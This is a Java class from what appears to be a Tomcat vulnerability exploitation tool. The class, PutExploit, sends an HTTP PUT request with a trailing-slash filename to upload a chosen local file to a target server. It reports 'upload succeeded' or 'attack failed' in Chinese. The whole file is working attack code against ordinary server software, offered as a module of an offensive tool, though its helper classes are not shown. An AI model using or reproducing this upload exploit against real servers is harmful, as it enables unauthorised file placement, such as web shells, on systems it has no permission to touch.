package org.dudu.TomcatVuln.Exploit;

import org.dudu.TomcatVuln.DTO.PutExpDTO;
import org.dudu.TomcatVuln.Interface.strategy.ExecuteStrategy;
import org.dudu.TomcatVuln.request.HttpRequest;
import org.dudu.TomcatVuln.utils.ConnectUtil;

import java.io.IOException;
import java.sql.Connection;

public class PutExploit extends HttpRequest<PutExpDTO,Integer> implements ExecuteStrategy<PutExpDTO>{
    @Override
    public String mark() {
        return "put";
    }

    @Override
    public String execute(PutExpDTO requestParam) throws Exception {
        if(request(requestParam)==201)
            return  "Put文件上传成功，访问路径："+ requestParam.getUrl()+"/"+ requestParam.getFilename();
        return "Put漏洞攻击失败";
    }

    @Override
    protected Integer request(PutExpDTO requestParam) throws IOException {
        this.setConnection(requestParam.getUrl()+"/"+requestParam.getFilename()+"/");
        return ConnectUtil.PutUploadFile(connection,requestParam.getFilePath());
    }
}
